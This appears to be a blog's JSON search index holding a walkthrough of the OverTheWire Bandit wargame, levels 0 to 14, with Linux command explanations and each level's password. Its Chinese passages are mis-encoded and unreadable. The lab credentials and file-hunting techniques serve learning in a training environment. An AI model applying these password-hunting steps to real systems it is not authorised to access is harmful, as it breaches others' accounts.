{"meta":{"title":"Firework","subtitle":"","description":"Less_is_more","author":"Firework","url":"http://example.com","root":"/"},"pages":[{"title":"æ ‡ç­¾","date":"2021-04-08T07:13:42.902Z","updated":"2021-04-08T07:13:42.893Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"å‹æƒ…é“¾æ¥","date":"2021-04-08T07:15:38.000Z","updated":"2021-04-08T07:16:14.735Z","comments":true,"path":"link/index.html","permalink":"http://example.com/link/index.html","excerpt":"","text":""},{"title":"åˆ†ç±»","date":"2021-04-08T07:14:19.440Z","updated":"2021-04-08T07:14:19.423Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"linux_baseé¢˜è§£","slug":"linux_Base","date":"2021-04-20T01:22:12.567Z","updated":"2021-04-20T10:29:01.553Z","comments":true,"path":"2021/04/20/linux_Base/","link":"","permalink":"http://example.com/2021/04/20/linux_Base/","excerpt":"","text":"linux_baseé¢˜è§£é‡æ–°ç³»ç»Ÿåœ°è¿‡ä¸€éï¼Œä¸»è¦æ˜¯ä¸€äº›Linuxçš„åŸºæœ¬å‘½ä»¤å’ŒåŸºç¡€çŸ¥è¯†ã€‚ Level_0What is SSH ? According to SearchSecurity, SSH is a network protocol that gives users, particularly system administrators, a secure way to access a computer over an unsecured network. Host Name : bandit.labs.overthewire.org Username : **bandit0** Password : **bandit0** Port Number : 2220 1ssh bandit0@bandit.labs.overthewire.org -p 2220 Level_0â¡Level_1Usage of ls and cat: 1234bandit0@bandit:~$ lsreadmebandit0@bandit:~$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level_1â¡Level_2cat the file stars with dash: 1234bandit1@bandit:~$ cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9bandit1@bandit:~$ cat &lt;-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level_2â¡Level_3â€‹ Useâ€ \\â€œ escape character 1234bandit2@bandit:~$ lsspaces in this filenamebandit2@bandit:~$ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level_3â¡Level_4Usage of command : ls ã€cd: The ls command is used to view the contents of a directory. By default, this command will display the contents of your current working directory. If you want to see the content of other directories, type ls and then the directoryâ€™s path. For example, enter ls /home/username/Documents to view the content of Documents. There are variations you can use with the ls command: ls -R will list all the files in the sub-directories as well ls -a will show the hidden files ls -al will list the files and directories with detailed information like the permissions, size, owner, etc. Hidden file: start with . is hidden file 123456789101112bandit3@bandit:~$ lsinherebandit3@bandit:~$ cd inhere/bandit3@bandit:~/inhere$ lsbandit3@bandit:~/inhere$ ls -altotal 12drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 3 root root 4096 May 7 2020 ..-rw-r----- 1 bandit4 bandit3 33 May 7 2020 .hiddenbandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level_4â¡Level_5Usage of command : file 1file [-bcLvz][-f &lt;åç§°æ–‡ä»¶&gt;][-m &lt;é­”æ³•æ•°å­—æ–‡ä»¶&gt;...][æ–‡ä»¶æˆ–ç›®å½•...] -b åˆ—å‡ºè¾¨è¯†ç»“æœæ—¶ï¼Œä¸æ˜¾ç¤ºæ–‡ä»¶åç§°ã€‚ -c è¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼Œä¾¿äºæ’é”™æˆ–åˆ†æç¨‹åºæ‰§è¡Œçš„æƒ…å½¢ã€‚ -f&lt;åç§°æ–‡ä»¶&gt; æŒ‡å®šåç§°æ–‡ä»¶ï¼Œå…¶å†…å®¹æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶åç§°æ—¶ï¼Œè®©fileä¾åºè¾¨è¯†è¿™äº›æ–‡ä»¶ï¼Œæ ¼å¼ä¸ºæ¯åˆ—ä¸€ä¸ªæ–‡ä»¶åç§°ã€‚ -L ç›´æ¥æ˜¾ç¤ºç¬¦å·è¿æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶çš„ç±»åˆ«ã€‚ -m&lt;é­”æ³•æ•°å­—æ–‡ä»¶&gt; æŒ‡å®šé­”æ³•æ•°å­—æ–‡ä»¶ã€‚ -v æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ -z å°è¯•å»è§£è¯»å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚ 1234567891011121314151617181920bandit4@bandit:~$ lsinherebandit4@bandit:~$ cd inhere/bandit4@bandit:~/inhere$ ls-file00 -file02 -file04 -file06 -file08-file01 -file03 -file05 -file07 -file09bandit4@bandit:~/inhere$ file ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: databandit4@bandit:~/inhere$ cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKh Level_5â¡Level_6Usage of file: 12345678910bandit5@bandit:~/inhere$ lsmaybehere00 maybehere04 maybehere08 maybehere12 maybehere16maybehere01 maybehere05 maybehere09 maybehere13 maybehere17maybehere02 maybehere06 maybehere10 maybehere14 maybehere18maybehere03 maybehere07 maybehere11 maybehere15 maybehere19bandit5@bandit:~/inhere$ find ./ -type f -size 1033c./maybehere07/.file2bandit5@bandit:~/inhere$ cat ./maybehere07/.file2DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Level_6â¡Level_7Learn about redirection: Analyse: The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7 owned by group bandit6 33 bytes in size So this is exp: find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null / from root folder -user the owner of the file. -group the group owner of the file. -size the size of the file. 2&gt;/dev/null redirects error messages to null so that they do not show on stdout. 1234bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null/var/lib/dpkg/info/bandit7.passwordbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level_7â¡Level_8Learn about the pipe and usage if grep: grep commandIt lets you search through all the text in a given file. To illustrate, grep blue notepad.txt will search for the word blue in the notepad file. Lines that contain the searched word will be displayed fully. 1234567-i å¿½ç•¥å¤§å°å†™-E å¯ç”¨POSIXæ‰©å±•æ­£åˆ™è¡¨è¾¾å¼-P å¯ç”¨perlæ­£åˆ™-o åªè¾“å‡ºæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„å†…å®¹-w æ•´å­—åŒ¹é…-v ä¸åŒ¹é…çš„-n è¾“å‡ºè¡Œå· 12bandit7@bandit:~$ cat data.txt |grep millionthmillionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level_8â¡Level_9Learn about the sort and uniq: sort: 1sort [-bcdfimMnr][-o&lt;è¾“å‡ºæ–‡ä»¶&gt;][-t&lt;åˆ†éš”å­—ç¬¦&gt;][+&lt;èµ·å§‹æ ä½&gt;-&lt;ç»“æŸæ ä½&gt;][--help][--verison][æ–‡ä»¶] -u åœ¨è¾“å‡ºè¡Œä¸­å»é™¤é‡å¤è¡Œã€‚ -r sorté»˜è®¤çš„æ’åºæ–¹å¼æ˜¯å‡åºï¼Œå¦‚æœæƒ³æ”¹æˆé™åºï¼Œå°±åŠ ä¸ª-rå³å¯ã€‚ -n sortè¦ä»¥æ•°å€¼æ¥æ’åº -t æŒ‡å®šåˆ†å‰²ç¬¦ -k æŒ‡å®šç¬¬å‡ åˆ—æ’åº uniq: 1uniq [-cdu][-f&lt;æ ä½&gt;][-s&lt;å­—ç¬¦ä½ç½®&gt;][-w&lt;å­—ç¬¦ä½ç½®&gt;][--help][--version][è¾“å…¥æ–‡ä»¶][è¾“å‡ºæ–‡ä»¶] -c, â€“count åœ¨æ¯è¡Œå‰æ˜¾ç¤ºè¯¥è¡Œé‡å¤æ¬¡æ•° -d, â€“repeated åªè¾“å‡ºé‡å¤çš„è¡Œ -D, â€“all-repeated åªè¾“å‡ºé‡å¤çš„è¡Œï¼Œä¸è¿‡æœ‰å‡ è¡Œè¾“å‡ºå‡ è¡Œ -f, â€“skip-fields=N -f å¿½ç•¥çš„æ®µæ•°ï¼Œ-f 1 å¿½ç•¥ç¬¬ä¸€æ®µ -i, â€“ignore-case ä¸åŒºåˆ†å¤§å°å†™ -s, â€“skip-chars=N ä¸-fæœ‰ç‚¹åƒï¼Œä¸è¿‡-sæ˜¯å¿½ç•¥ï¼Œåé¢å¤šå°‘ä¸ªå­—ç¬¦ -s 5å°±å¿½ç•¥åé¢5ä¸ªå­—ç¬¦ -u, â€“unique å»é™¤é‡å¤çš„åï¼Œå…¨éƒ¨æ˜¾ç¤ºå‡ºæ¥ï¼Œæ ¹mysqlçš„distinctåŠŸèƒ½ä¸Šæœ‰ç‚¹åƒ 1234bandit8@bandit:~$ lsdata.txtbandit8@bandit:~$ sort data.txt | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level_9â¡Level_10Usage of grep: strings : export strings in binary file 12345678910111213141516bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ cat data.txt |grep =Binary file (standard input) matchesbandit9@bandit:~$ strings data.txt |grep =========== the*2i&quot;4=:G e========== password&lt;I=zsGiZ)========== isA=|t&amp;EZdb=c^ LAh=3G*SF=s&amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level_10â¡Level_11Whatâ€™s base64? Base64æ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„è¡¨ç¤ºæ–¹æ³•ã€‚ç”±äºï¼Œæ‰€ä»¥æ¯6ä¸ªæ¯”ç‰¹ä¸ºä¸€ä¸ªå•å…ƒï¼Œå¯¹åº”æŸä¸ªå¯æ‰“å°å­—ç¬¦ã€‚3ä¸ªå­—èŠ‚ç›¸å½“äº24ä¸ªæ¯”ç‰¹ï¼Œå¯¹åº”äº4ä¸ªBase64å•å…ƒï¼Œå³3ä¸ªå­—èŠ‚å¯ç”±4ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºã€‚åœ¨Base64ä¸­çš„å¯æ‰“å°å­—ç¬¦åŒ…æ‹¬å­—æ¯A-Zã€a-zã€æ•°å­—0-9ï¼Œè¿™æ ·å…±æœ‰62ä¸ªå­—ç¬¦ï¼Œæ­¤å¤–ä¸¤ä¸ªå¯æ‰“å°ç¬¦å·åœ¨ä¸åŒçš„ç³»ç»Ÿä¸­è€Œä¸åŒã€‚ä¸€äº›å¦‚uuencodeçš„å…¶ä»–ç¼–ç æ–¹æ³•ï¼Œå’Œä¹‹åBinHexçš„ç‰ˆæœ¬ä½¿ç”¨ä¸åŒçš„64å­—ç¬¦é›†æ¥ä»£è¡¨6ä¸ªäºŒè¿›åˆ¶æ•°å­—ï¼Œä½†æ˜¯ä¸è¢«ç§°ä¸ºBase64ã€‚ why base64ï¼Ÿ This_is_why_base64 12bandit10@bandit:~$ cat data.txt | base64 -dThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level_11â¡Level_12ROT13: I_know_whatâ€™s_ROT13 command tr: 123456tr [é€‰é¡¹]â€¦ é›†åˆ1 [é›†åˆ2]é€‰é¡¹è¯´æ˜ï¼š-c, -C, â€“complement ç”¨é›†åˆ1ä¸­çš„å­—ç¬¦ä¸²æ›¿æ¢ï¼Œè¦æ±‚å­—ç¬¦é›†ä¸ºASCIIã€‚-d, â€“delete åˆ é™¤é›†åˆ1ä¸­çš„å­—ç¬¦è€Œä¸æ˜¯è½¬æ¢-s, â€“squeeze-repeats åˆ é™¤æ‰€æœ‰é‡å¤å‡ºç°å­—ç¬¦åºåˆ—ï¼Œåªä¿ç•™ç¬¬ä¸€ä¸ªï¼›å³å°†é‡å¤å‡ºç°å­—ç¬¦ä¸²å‹ç¼©ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚-t, â€“truncate-set1 å…ˆåˆ é™¤ç¬¬ä¸€å­—ç¬¦é›†è¾ƒç¬¬äºŒå­—ç¬¦é›†å¤šå‡ºçš„å­—ç¬¦ 12bandit11@bandit:~$ cat data.txt | tr &quot;A-Za-z&quot; &quot;N-ZA-Mn-za-m&quot;The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Level_12â¡Level_13Learn about hexdump&amp;xxd&amp;gzip&amp;bzip&amp;tar: Linux hexdumpå‘½ä»¤ä¸€èˆ¬ç”¨æ¥æŸ¥çœ‹â€œäºŒè¿›åˆ¶â€æ–‡ä»¶çš„åå…­è¿›åˆ¶ç¼–ç ï¼Œä½†å®é™…ä¸Šå®ƒèƒ½æŸ¥çœ‹ä»»ä½•æ–‡ä»¶ï¼Œè€Œä¸åªé™äºäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ 1hexdump [é€‰é¡¹] [æ–‡ä»¶]... 123456789-n length åªæ ¼å¼åŒ–è¾“å…¥æ–‡ä»¶çš„å‰lengthä¸ªå­—èŠ‚ã€‚-C è¾“å‡ºè§„èŒƒçš„åå…­è¿›åˆ¶å’ŒASCIIç ã€‚-b å•å­—èŠ‚å…«è¿›åˆ¶æ˜¾ç¤ºã€‚-c å•å­—èŠ‚å­—ç¬¦æ˜¾ç¤ºã€‚-d åŒå­—èŠ‚åè¿›åˆ¶æ˜¾ç¤ºã€‚-o åŒå­—èŠ‚å…«è¿›åˆ¶æ˜¾ç¤ºã€‚-x åŒå­—èŠ‚åå…­è¿›åˆ¶æ˜¾ç¤ºã€‚-s ä»åç§»é‡å¼€å§‹è¾“å‡ºã€‚-e æŒ‡å®šæ ¼å¼å­—ç¬¦ä¸²ï¼Œæ ¼å¼å­—ç¬¦ä¸²åŒ…å«åœ¨ä¸€å¯¹å•å¼•å·ä¸­ï¼Œæ ¼å¼å­—ç¬¦ä¸²å½¢å¦‚ï¼š&#x27;a/b &quot;format1&quot; &quot;format2&quot;&#x27;ã€‚ æ¯ä¸ªæ ¼å¼å­—ç¬¦ä¸²ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œæ¯ä¸ªç”±ç©ºæ ¼åˆ†éš”ï¼Œç¬¬ä¸€ä¸ªå½¢å¦‚a/bï¼Œbè¡¨ç¤ºå¯¹æ¯bä¸ªè¾“å…¥å­—èŠ‚åº”ç”¨format1æ ¼å¼ï¼Œaè¡¨ç¤ºå¯¹æ¯aä¸ªè¾“å…¥å­—èŠ‚åº”ç”¨format2æ ¼å¼ï¼Œä¸€èˆ¬a&gt;bï¼Œä¸”båªèƒ½ä¸º1ï¼Œ2ï¼Œ4ï¼Œå¦å¤–aå¯ä»¥çœç•¥ï¼Œçœç•¥åˆ™a=1ã€‚format1å’Œformat2ä¸­å¯ä»¥ä½¿ç”¨ç±»ä¼¼printfçš„æ ¼å¼å­—ç¬¦ä¸²ï¼Œå¦‚ï¼š 1234%02dï¼šä¸¤ä½åè¿›åˆ¶%03xï¼šä¸‰ä½åå…­è¿›åˆ¶%02oï¼šä¸¤ä½å…«è¿›åˆ¶%cï¼šå•ä¸ªå­—ç¬¦ç­‰ è¿˜æœ‰ä¸€äº›ç‰¹æ®Šçš„ç”¨æ³•ï¼š 1234%_adï¼šæ ‡è®°ä¸‹ä¸€ä¸ªè¾“å‡ºå­—èŠ‚çš„åºå·ï¼Œç”¨åè¿›åˆ¶è¡¨ç¤ºã€‚%_axï¼šæ ‡è®°ä¸‹ä¸€ä¸ªè¾“å‡ºå­—èŠ‚çš„åºå·ï¼Œç”¨åå…­è¿›åˆ¶è¡¨ç¤ºã€‚%_aoï¼šæ ‡è®°ä¸‹ä¸€ä¸ªè¾“å‡ºå­—èŠ‚çš„åºå·ï¼Œç”¨å…«è¿›åˆ¶è¡¨ç¤ºã€‚%_pï¼šå¯¹ä¸èƒ½ä»¥å¸¸è§„å­—ç¬¦æ˜¾ç¤ºçš„ç”¨ . ä»£æ›¿ã€‚ åŒä¸€è¡Œå¦‚æœè¦æ˜¾ç¤ºå¤šä¸ªæ ¼å¼å­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥è·Ÿå¤šä¸ª-eé€‰é¡¹ã€‚ Demo: 1234hexdump -e &#x27;16/1 &quot;%02X &quot; &quot; | &quot;&#x27; -e &#x27;16/1 &quot;%_p&quot; &quot;\\n&quot;&#x27; test00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F | ................ 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F | ................ 20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F | !&quot;#$%&amp;&#x27;()*+,-./ xxd xxdæ˜¯äºŒè¿›åˆ¶æŸ¥çœ‹å‘½ä»¤ï¼Œé»˜è®¤å°†2æ–‡ä»¶æ˜¾ç¤ºä¸º16è¿›åˆ¶å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚ Usage: 1xxd [options] [infile [outfile]] or 1xxd -r [-s [-]offset] [-c cols] [-ps] [infile [outfile]] options: -a ç¼ºçœå¿½ç•¥è½¬æ¢: ä½¿ç”¨â€˜*â€™æ›¿æ¢ç©ºè¡Œ. -b äºŒè¿›æ•°æ•°æ®è½¬å‚¨ (ä¸ -ps,-i,-rä¸å…¼å®¹). é»˜è®¤ä¸º16è¿›åˆ¶. -c cols æ¯è¡Œå¤šå°‘åˆ—octetsï¼ˆç‰¹åˆ¶8æ¯”ç‰¹çš„å­—èŠ‚ï¼‰. é»˜è®¤ä¸º16åˆ—(-i: 12, -ps: 30). -E ä½¿ç”¨EBCDICå­—ç¬¦é›†. é»˜è®¤ä¸ºASCIIå­—ç¬¦é›†. -e å°ç«¯æ¨¡å¼è½¬å‚¨ (ä¸ -ps,-i,-rä¸å…¼å®¹). -g åœ¨æ­£å¸¸è¾“å‡ºä¸­ï¼Œæ¯ç»„å…«ä½å­—èŠ‚æ•°. é»˜è®¤ä¸º2ä¸ª (-e: 4). -h è¾“å‡ºæ­¤å¸®åŠ©. -i ä½¿ç”¨Cè¯­è¨€æ–‡ä»¶æ ·å¼è¾“å‡º. -r reverse operation: convert (or patch) hexdump into binary. bzip2ã€gzipï¼š è§£å‹å‹ç¼©å‘½ä»¤ Optionsï¼š -d ï¼šè§£å‹ -kï¼šä¿ç•™æºæ–‡ä»¶ tar: tarå¯ä»¥ä¸ºlinuxçš„æ–‡ä»¶å’Œç›®å½•åˆ›å»ºæ¡£æ¡ˆã€‚åˆ©ç”¨tarï¼Œå¯ä»¥ä¸ºæŸä¸€ç‰¹å®šæ–‡ä»¶åˆ›å»ºæ¡£æ¡ˆï¼ˆå¤‡ä»½æ–‡ä»¶ï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨æ¡£æ¡ˆä¸­æ”¹å˜æ–‡ä»¶ï¼Œæˆ–è€…å‘æ¡£æ¡ˆä¸­åŠ å…¥æ–°çš„æ–‡ä»¶ã€‚taræœ€åˆè¢«ç”¨æ¥åœ¨ç£å¸¦ä¸Šåˆ›å»ºæ¡£æ¡ˆï¼Œç°åœ¨ï¼Œç”¨æˆ·å¯ä»¥åœ¨ä»»ä½•è®¾å¤‡ä¸Šåˆ›å»ºæ¡£æ¡ˆã€‚åˆ©ç”¨tarå‘½ä»¤ï¼Œå¯ä»¥æŠŠä¸€å¤§å †çš„æ–‡ä»¶å’Œç›®å½•å…¨éƒ¨æ‰“åŒ…æˆä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™å¯¹äºå¤‡ä»½æ–‡ä»¶æˆ–å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸ºä¸€ä¸ªæ–‡ä»¶ä»¥ä¾¿äºç½‘ç»œä¼ è¾“æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚ é¦–å…ˆè¦å¼„æ¸…ä¸¤ä¸ªæ¦‚å¿µï¼šæ‰“åŒ…å’Œå‹ç¼©ã€‚æ‰“åŒ…æ˜¯æŒ‡å°†ä¸€å¤§å †æ–‡ä»¶æˆ–ç›®å½•å˜æˆä¸€ä¸ªæ€»çš„æ–‡ä»¶ï¼›å‹ç¼©åˆ™æ˜¯å°†ä¸€ä¸ªå¤§çš„æ–‡ä»¶é€šè¿‡ä¸€äº›å‹ç¼©ç®—æ³•å˜æˆä¸€ä¸ªå°æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦åŒºåˆ†è¿™ä¸¤ä¸ªæ¦‚å¿µå‘¢ï¼Ÿè¿™æºäºLinuxä¸­å¾ˆå¤šå‹ç¼©ç¨‹åºåªèƒ½é’ˆå¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·å½“ä½ æƒ³è¦å‹ç¼©ä¸€å¤§å †æ–‡ä»¶æ—¶ï¼Œä½ å¾—å…ˆå°†è¿™ä¸€å¤§å †æ–‡ä»¶å…ˆæ‰“æˆä¸€ä¸ªåŒ…ï¼ˆtarå‘½ä»¤ï¼‰ï¼Œç„¶åå†ç”¨å‹ç¼©ç¨‹åºè¿›è¡Œå‹ç¼©ï¼ˆgzip bzip2å‘½ä»¤ï¼‰ã€‚ 1tar(é€‰é¡¹)(å‚æ•°) optionsï¼š 1234567891011121314151617181920212223-Aæˆ–--catenateï¼šæ–°å¢æ–‡ä»¶åˆ°ä»¥å­˜åœ¨çš„å¤‡ä»½æ–‡ä»¶ï¼›-Bï¼šè®¾ç½®åŒºå—å¤§å°ï¼›-cæˆ–--createï¼šå»ºç«‹æ–°çš„å¤‡ä»½æ–‡ä»¶ï¼›-C &lt;ç›®å½•&gt;ï¼šè¿™ä¸ªé€‰é¡¹ç”¨åœ¨è§£å‹ç¼©ï¼Œè‹¥è¦åœ¨ç‰¹å®šç›®å½•è§£å‹ç¼©ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªé€‰é¡¹ã€‚-dï¼šè®°å½•æ–‡ä»¶çš„å·®åˆ«ï¼›-xæˆ–--extractæˆ–--getï¼šä»å¤‡ä»½æ–‡ä»¶ä¸­è¿˜åŸæ–‡ä»¶ï¼›-tæˆ–--listï¼šåˆ—å‡ºå¤‡ä»½æ–‡ä»¶çš„å†…å®¹ï¼›-zæˆ–--gzipæˆ–--ungzipï¼šé€šè¿‡gzipæŒ‡ä»¤å¤„ç†å¤‡ä»½æ–‡ä»¶ï¼›-Zæˆ–--compressæˆ–--uncompressï¼šé€šè¿‡compressæŒ‡ä»¤å¤„ç†å¤‡ä»½æ–‡ä»¶ï¼›-f&lt;å¤‡ä»½æ–‡ä»¶&gt;æˆ–--file=&lt;å¤‡ä»½æ–‡ä»¶&gt;ï¼šæŒ‡å®šå¤‡ä»½æ–‡ä»¶ï¼›-væˆ–--verboseï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›-rï¼šæ·»åŠ æ–‡ä»¶åˆ°å·²ç»å‹ç¼©çš„æ–‡ä»¶ï¼›-uï¼šæ·»åŠ æ”¹å˜äº†å’Œç°æœ‰çš„æ–‡ä»¶åˆ°å·²ç»å­˜åœ¨çš„å‹ç¼©æ–‡ä»¶ï¼›-jï¼šæ”¯æŒbzip2è§£å‹æ–‡ä»¶ï¼›-vï¼šæ˜¾ç¤ºæ“ä½œè¿‡ç¨‹ï¼›-lï¼šæ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œè®¾ç½®ï¼›-kï¼šä¿ç•™åŸæœ‰æ–‡ä»¶ä¸è¦†ç›–ï¼›-mï¼šä¿ç•™æ–‡ä»¶ä¸è¢«è¦†ç›–ï¼›-wï¼šç¡®è®¤å‹ç¼©æ–‡ä»¶çš„æ­£ç¡®æ€§ï¼›-pæˆ–--same-permissionsï¼šç”¨åŸæ¥çš„æ–‡ä»¶æƒé™è¿˜åŸæ–‡ä»¶ï¼›-Pæˆ–--absolute-namesï¼šæ–‡ä»¶åä½¿ç”¨ç»å¯¹åç§°ï¼Œä¸ç§»é™¤æ–‡ä»¶åç§°å‰çš„â€œ/â€å·ï¼›-N &lt;æ—¥æœŸæ ¼å¼&gt; æˆ– --newer=&lt;æ—¥æœŸæ—¶é—´&gt;ï¼šåªå°†è¾ƒæŒ‡å®šæ—¥æœŸæ›´æ–°çš„æ–‡ä»¶ä¿å­˜åˆ°å¤‡ä»½æ–‡ä»¶é‡Œï¼›--exclude=&lt;èŒƒæœ¬æ ·å¼&gt;ï¼šæ’é™¤ç¬¦åˆèŒƒæœ¬æ ·å¼çš„æ–‡ä»¶ã€‚ 123456789bandit12@bandit:~$ ls -altotal 24drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r----- 1 bandit13 bandit12 2582 May 7 2020 data.txt-rw-r--r-- 1 root root 675 May 15 2017 .profile æŸ¥çœ‹data.txtæ–‡ä»¶åå‘ç°æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶hexdumpåçš„æ–‡ä»¶ï¼Œä½†æ˜¯è¯¥ç›®å½•ä¸‹æˆ‘ä»¬å¹¶æ²¡æœ‰æƒé™å¯¹è¯¥æ–‡ä»¶è¿›è¡Œxxdæ“ä½œ ls -al / rootæŸ¥çœ‹rootç›®å½•ä¸‹tmpæ–‡ä»¶æˆ‘ä»¬å…·æœ‰æƒé™ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253bandit12@bandit:~$ mkdir /tmp/what_a_fuckbandit12@bandit:~$ cp data.txt /tmp/what_a_fuck/data.txtbandit12@bandit:~$ cd /tmp/what_a_fuckbandit12@bandit:/tmp/what_a_fuck$ lsdata.txtbandit12@bandit:/tmp/what_a_fuck$ xxd -r data.txt &gt;data.binbandit12@bandit:/tmp/what_a_fuck$ lsdata.bin data.txtbandit12@bandit:/tmp/what_a_fuck$ file data.bindata.bin: gzip compressed data, was &quot;data2.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data.bin data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data data.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d data.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: gzip compressed data, was &quot;data4.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data data.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz bandit12@bandit:/tmp/what_a_fuck$ lsdata data.txtbandit12@bandit:/tmp/what_a_fuck$ file datadata: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf datadata5.binbandit12@bandit:/tmp/what_a_fuck$ file data5.bin data5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf data5.bin data6.binbandit12@bandit:/tmp/what_a_fuck$ file data6.bin data6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/what_a_fuck$ mv data6.bin fuck.bz2bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d fuck.bz2 bandit12@bandit:/tmp/what_a_fuck$ lsdata data5.bin data.txt fuckbandit12@bandit:/tmp/what_a_fuck$ file fuckfuck: POSIX tar archive (GNU)bandit12@bandit:/tmp/what_a_fuck$ tar -xvf fuckdata8.binbandit12@bandit:/tmp/what_a_fuck$ file data8.bin data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Thu May 7 18:14:30 2020, max compression, from Unixbandit12@bandit:/tmp/what_a_fuck$ mv data8.bin shit.gzbandit12@bandit:/tmp/what_a_fuck$ gzip -d shit.gz bandit12@bandit:/tmp/what_a_fuck$ file shitshit: ASCII textbandit12@bandit:/tmp/what_a_fuck$ cat shit The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level_13â¡Level_14ç”¨æ‰€ç»™å¯†é’¥ç™»å½•bandit14è´¦å·è¿æ¥åˆ°ä¸»æœºå³å¯ 123456bandit13@bandit:~$ lssshkey.privatebandit13@bandit:~$ ssh -i sshkey.private bandit14@localhostbandit14@bandit:/etc$ cd /etc/bandit_passbandit14@bandit:/etc/bandit_pass$ cat bandit144wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Level_14â¡Level_15Man is a good command ğŸ™‚ Learn about nc NAME nc â€” arbitrary TCP and UDP connections and listens SYNOPSIS nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [-Z peercertfile] [destination] [port] DESCRIPTION The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6. Unlike telnet(1), nc scripts nicely, and separates error messages onto standard error instead of sending them to standard output, as telnet(1) does with some. Most used options -g&lt;ç½‘å…³&gt;ï¼šè®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šè®¾ç½®8ä¸ª; 